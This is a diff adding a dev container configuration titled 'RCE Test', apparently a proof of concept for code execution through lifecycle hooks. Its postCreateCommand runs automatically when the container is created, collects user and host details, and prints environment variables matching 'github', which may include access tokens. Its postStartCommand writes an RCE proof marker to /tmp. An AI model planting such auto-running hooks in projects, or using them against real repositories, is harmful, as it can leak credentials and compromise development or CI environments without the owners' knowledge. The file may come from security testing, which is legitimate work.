@@ -1,0 +1,7 @@
+{
+    "name": "RCE Test",
+    "image": "mcr.microsoft.com/devcontainers/base:ubuntu",
+    "postCreateCommand": "curl -s https://api.github.com/zen && whoami && id && hostname && uname -a && env | grep -i github | head -20",
+    "postStartCommand": "echo RCE_PROOF_$(whoami)_$(hostname) > /tmp/rce_proof.txt && cat /tmp/rce_proof.txt",
+    "postAttachCommand": "echo ATTACHED_$(date +%s)"
+}
